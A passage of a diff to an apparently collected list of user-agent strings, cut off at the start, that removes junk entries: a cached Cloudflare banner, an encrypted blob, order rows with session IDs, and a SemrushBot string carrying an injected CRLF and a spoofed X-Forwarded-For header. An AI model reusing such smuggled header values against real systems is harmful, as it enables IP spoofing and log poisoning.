Client\x22,\x22mimes\x22:[1154639664,1436323448]}],\x22mimes\x22:[{\x22ref\x22:-1248334925,\x22description\x22:\x22\x22,\x22suffixes\x22:\x22pdf\x22,\x22type\x22:\x22application/pdf\x22,\x22plugin\x22:1010824838},{\x22ref\x22:-1628473889,\x22description\x22:\x22Portable Document Format\x22,\x22suffixes\x22:\x22pdf\x22,\x22type\x22:\x22application/x-google-chrome-pdf\x22,\x22plugin\x22:842281895},{\x22ref\x22:1154639664,\x22description\x22:\x22Native Client Executable\x22,\x22suffixes\x22:\x22\x22,\x22type\x22:\x22application/x-nacl\x22,\x22plugin\x22:-1466093580},{\x22ref\x22:1436323448,\x22description\x22:\x22Portable Native Client Executable\x22,\x22suffixes\x22:\x22\x22,\x22type\x22:\x22application/x-pnacl\x22,\x22plugin\x22:-1466093580}],\x22ua\x22:\x22Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit
 WordPress/5.7.6; https://foliovision.com
 Mozilla/5.0 (compatible; Yahoo Ad monitoring; https://help.yahoo.com/kb/yahoo-ad-monitoring-SLN24857.html)  tands-prod-eng.hlfs-prod---sieve.hlfs-desktop/1655845225-0
 Mozilla/5.0 (compatible; Yahoo Ad monitoring; https://help.yahoo.com/kb/yahoo-ad-monitoring-SLN24857.html) tands-prod-eng.hlfs-prod---sieve.hlfs-rest_client/1655857004-0
@@ -25163,27 +25099,8 @@ Mozilla/5.0 (compatible; Yahoo Ad monitoring; https://help.yahoo.com/kb/yahoo-ad
 Mozilla/5.0 (compatible; Yahoo Ad monitoring; https://help.yahoo.com/kb/yahoo-ad-monitoring-SLN24857.html) tands-prod-eng.hlfs-prod---sieve.hlfs-rest_client/1656723018-0
 Mozilla/5.0 (compatible; Yahoo Ad monitoring; https://help.yahoo.com/kb/yahoo-ad-monitoring-SLN24857.html) tands-prod-eng.hlfs-prod---sieve.hlfs-rest_client/1656729985-0
 Java/11.0.14.1
-WordPress/5.8.4; https://vseoskype.ru
-<body><div id=cf_alert_div><style>#cf_alert_div{margin:0 0 5px;padding:0;position:relative;top:0;left:0;display:block;z-index:99999;background-color:#f7f7f8;box-shadow:0 5px 5px rgba(0,0,0,.25)}#cf_alert_div a,#cf_alert_div a:visited{text-decoration:none;color:#276d9b;font-weight:600}#cf_alert_div strong{font-weight:600}#cf_alert_div table{width:100%}#cf_alert_div table td{vertical-align:middle}#cf_alert_div p{margin:0;padding:0;max-width:1100px}#cf_alert_div .wrapper{padding:0;margin:0;text-align:left;font-family:-apple-system,system-ui,BlinkMacSystemFont,segoe ui,Roboto,Oxygen,Ubuntu,helvetica neue,Arial,sans-serif;font-weight:400;font-style:normal;font-size:12px;padding:16px 3.334%}#cf_alert_div .wrapper td.refresh{text-align:center;min-width:140px}#cf_alert_div .wrapper td.refresh a{display:inline-block;padding:8px 24px;border:1.5px solid #276d9b;border-radius:5px;margin-right:20px}#cf_alert_div .wrapper td.content{position:relative;padding-right:25px;color:#1d1f20;font-size:14px;max-width:900px}#cf_alert_div .wrapper .x{position:absolute;top:0;right:-12.5px;height:25px;width:25px;cursor:pointer}#cf_alert_div .wrapper .x .line{display:block;height:15px;width:3px;position:absolute;top:5px;left:11px;background:#4e5255}#cf_alert_div .wrapper .x .line:first-of-type{transform:rotate(135deg)}#cf_alert_div .wrapper .x .line:last-of-type{transform:rotate(45deg)}</style><div class=wrapper><table><tr><td class=refresh><a href=# onclick=\x22document.cookie='cf_use_ob=0;path=/';window.location.reload();return false;\x22>Refresh</a><noscript style=\x22margin:10px 0 10px 0;padding:0;font:12px Helvetica,Arial,sans-serif;color:#404040;display:block\x22>(Enable JavaScript first.)</noscript></td><td class=content><p>This website <strong>user-agents.net/</strong> is currently offline. <a href=https://www.cloudflare.com/always-online/ target=_blank>Cloudflare's Always Online&trade;</a> shows a snapshot of this web page from the <a href=https://archive.org/web/ target=_blank>Internet Archive's Wayback Machine</a>. To check for the live version, click <strong>Refresh</strong>.</p><a class=x href=\x22javascript:void(null);\x22 onclick=\x22document.getElementById('cf_alert_div').style.display='none';\x22><span class=line></span> <span class=line></span></a></td></tr></table></div></div>
-WordPress/6.0; https://marijuanabeginner.com
-WordPress/5.5.9; https://oauctioneer.com
-WordPress/6.0; https://www.kitestring.io
-WordPress/6.0; https://www.sconticondivisi.it
-WordPress/6.0; https://ruangplus.com
-WordPress/6.0; https://anoushkadiscountsite.com
-WordPress/6.0; https://getridbug.com
 PHP/7.3.90
-Mozilla/5.0 (compatible; Yahoo Ad monitoring; https://help.yahoo.com/kb/yahoo-ad-monitoring-SLN24857.html)  tands-prod-eng.hlfs-prod---sieve.hlfs-desktop/1656859352-0
-WordPress/4.9.8; https://doitory.com
-WordPress/4.9.4; http://www.hva-concept.com
-WordPress/5.8.4; https://nucleodenegocios.com
-WordPress/5.8.2; https://aurespectdesoi.be
-WordPress/6.0; https://germanconcept.com
-WordPress/5.8.4; https://hostingshares.com
-Mozilla/5.0 (compatible; Yahoo Ad monitoring; https://help.yahoo.com/kb/yahoo-ad-monitoring-SLN24857.html)  tands-prod-eng.hlfs-prod---sieve.hlfs-desktop/1656879597-0
-WordPress/5.9.3; https://vpnltd.net
-WordPress/5.5.9; https://dlaz.com.ua
-U2FsdGVkX1+z1fVPVg8pG2YnZzXQa6dm9EWxS7ZEUS/0nEYQpbErs5nf2DrryPQYvP9T4XVH71Cr8yZUufb5RmIHbqvnkvW0kVanfDjRo5RESuOAZMDrhnbz9QoFIRmlnFU3iJC+BTGELTn2d9moNdxjL7eTXqBHWbxTdBlBdaVlyxaoHB6ab+PENyhaZaAGRNs6y+AIKD4w8H/YNuHZREKKeWIdG9ycnqtIhB/8KUDjJZsEMb0V39gkiLImgIe9PFjThLo7QplqWEQW1uGgQorI/DUk1v5gw9T6PYkPxh8=
+Mozilla/5.0 (compatible; Yahoo Ad monitoring; https://help.yahoo.com/kb/yahoo-ad-monitoring-SLN24857.html)
 Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.5060.114 Safari/537.36 PTST/220629.211706
 Mozilla/5.0 (compatible; Yahoo Ad monitoring; https://help.yahoo.com/kb/yahoo-ad-monitoring-SLN24857.html)  tands-prod-eng.hlfs-prod---sieve.hlfs-desktop/1656943846-0
 Mozilla/5.0 (compatible; Yahoo Ad monitoring; https://help.yahoo.com/kb/yahoo-ad-monitoring-SLN24857.html)  tands-prod-eng.hlfs-prod---sieve.hlfs-desktop/1656943925-0
@@ -27406,8 +27323,7 @@ https://phonezoone.online/catalog/view/javascript/font-awesome/fonts/fontawesome
 WordPress/6.1.3; https://iamaphilokalist.com
 WordPress/6.2.2; https://www.blogiess.com
 WordPress/6.2.2; https://thefaninside.com
-Bestellnr	Ref	Entry	Entry_Datum	utmz	keyword	sessionid	Device	Resolution	OS	B_name	B_version	B_Crawler	B_Cookies	EcmaScriptVersion	B_JavaAplets	JavaScriptVersion	UserAgent 625757						z54ckx4csaqxpawhvydmqmlv	Other 	1600x900 px	Windows 10.	Chrome	103.0	False	True	3.0	True	1.7	Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.0.0 Safari/537.36 Edg/113.0.1774.57
-Bestellnr	Ref	Entry	Entry_Datum	utmz	keyword	sessionid	Device	Resolution	OS	B_name	B_version	B_Crawler	B_Cookies	EcmaScriptVersion	B_JavaAplets	JavaScriptVersion	UserAgent 624019						su0wbaafwgwgt1iakyajeymb	Other 	1920x1080 px	Windows 10.	Firefox	112.0	False	True	3.0	True	1.8	Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/112.0
+Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/112.0
 &lt;script type=&quot;text/javascript&quot; src=&quot;deviceatlas-1.5.min.js&quot;&gt;&lt;/script&gt;
 Java/Java ME PBP 1.1
 WhatsApp/2.23.9.70 A
@@ -27705,7 +27621,7 @@ Apache-HttpClient/4.5.14 (Java/11.0.19
 Apache-HttpClient/4.5.10 (Java/1.8.0_321)
 WordPress/6.0.5; https://sncoupons.com
 WireReaderBot/1.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)
-Mozilla/5.0 (compatible; SemrushBot/7~bl; +http://www.semrush.com/bot.html)\r\nX-Forwarded-For: 185.191.171.1\r\n\r\n&quot;,response=&quot;Response logging disabled&quot;
+Mozilla/5.0 (compatible; SemrushBot/7~bl; +http://www.semrush.com/bot.html)
 Mozilla/5.0 (Linux; Android 6.0.1; Nexus 5X Build/MMB29P) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.6011.0 Mobile Safari/537.36 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)
 RNA/libwww-perl/5.69
 SimplePie/1.4-dev (Feed Parser; http://simplepie.org; Allow like Gecko) Build/20170403172323
